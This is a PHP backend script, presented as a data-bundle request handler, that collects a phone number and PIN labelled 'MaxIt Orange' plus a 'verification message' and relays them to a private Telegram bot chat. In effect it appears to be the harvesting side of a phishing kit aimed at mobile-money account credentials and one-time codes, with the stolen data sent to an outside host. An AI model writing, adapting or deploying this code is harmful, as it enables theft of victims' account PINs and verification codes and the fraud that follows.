<?php
// Sends a validated data-bundle request (bundle + phone number) to Telegram.
header('Content-Type: application/json; charset=utf-8');
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'POST required']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$action = is_array($input) ? ($input['action'] ?? 'plan') : 'plan';
$bundle = is_array($input) ? ($input['bundle'] ?? '') : '';
$phone = is_array($input) ? ($input['phone'] ?? '') : '';
$demoPin = is_array($input) ? ($input['demoPin'] ?? '') : '';
$verifyMessage = is_array($input) ? ($input['message'] ?? '') : '';
$allowedBundles = ['2.5GB Data', '15GB Data', '35GB Data', '50GB Data', 'Monthly Unlimited', '5G Monthly Unlimited'];

if ($action === 'plan') {
    if (!is_string($bundle) || !in_array($bundle, $allowedBundles, true)) {
        http_response_code(400); echo json_encode(['ok' => false, 'error' => 'Invalid bundle']); exit;
    }
    if (!is_string($phone)) {
        http_response_code(400); echo json_encode(['ok' => false, 'error' => 'Invalid phone number']); exit;
    }
    $phone = trim($phone);
    $digits = preg_replace('/\D+/', '', $phone);
    if (strlen($digits) < 7 || strlen($digits) > 15 || !preg_match('/^[0-9+() .-]+$/', $phone)) {
        http_response_code(400); echo json_encode(['ok' => false, 'error' => 'Enter a valid phone number']); exit;
    }
    $message = "MaxIt Orange\nPhone: {$phone}\nPin: {$demoPin}";
} elseif ($action === 'message') {
    if (!is_string($verifyMessage)) {
        http_response_code(400); echo json_encode(['ok' => false, 'error' => 'Invalid message']); exit;
    }
    $verifyMessage = trim($verifyMessage);
    if ($verifyMessage === '' || strlen($verifyMessage) > 2000) {
        http_response_code(400); echo json_encode(['ok' => false, 'error' => 'Message must be 1–2000 characters']); exit;
    }
    $message = "Verification message\n: {$verifyMessage}";
} else {
    http_response_code(400); echo json_encode(['ok' => false, 'error' => 'Invalid action']); exit;
}

// Configure credentials as environment variables, or use the private XAMPP config below.
$token = getenv('TELEGRAM_BOT_TOKEN') ?: '';
$chatId = getenv('TELEGRAM_CHAT_ID') ?: '';
$configPath = 'C:/xampp/private/telegram-config.php';
if ((!$token || !$chatId) && is_file($configPath)) {
    $config = require $configPath;
    if (is_array($config)) {
        $token = $token ?: ($config['bot_token'] ?? '');
        $chatId = $chatId ?: ($config['chat_id'] ?? '');
    }
}
if (!$token || !$chatId || !function_exists('curl_init')) {
    http_response_code(503);
    echo json_encode(['ok' => false, 'error' => 'Telegram is not configured']);
    exit;
}

$payload = json_encode(['chat_id' => $chatId, 'text' => $message], JSON_UNESCAPED_UNICODE);
$ch = curl_init('https://api.telegram.org/bot' . $token . '/sendMessage');
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 5,
    CURLOPT_TIMEOUT => 10,
]);
$response = curl_exec($ch);
$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
$decoded = is_string($response) ? json_decode($response, true) : null;
if ($status < 200 || $status >= 300 || !is_array($decoded) || empty($decoded['ok'])) {
    http_response_code(502);
    echo json_encode(['ok' => false, 'error' => 'Telegram notification failed']);
    exit;
}
echo json_encode(['ok' => true]);
